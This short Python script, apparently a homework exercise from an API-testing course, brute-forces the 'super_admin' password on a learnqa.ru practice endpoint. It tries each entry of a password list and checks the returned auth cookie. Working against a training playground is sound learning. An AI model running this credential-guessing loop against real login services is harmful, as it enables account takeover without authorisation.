import requests

payload = {"login": "super_admin", "password": "password"}
with open('Lesson2/passwords.txt') as f:
    passwords = f.read().splitlines()

for x in passwords:
    payload["password"] = x
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    auth_cookie = dict(response.cookies)

    response_with_cookie = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=auth_cookie)
    if response_with_cookie.text == 'You are authorized':
        print(f"{response_with_cookie.text}, Верный пароль - {x}")
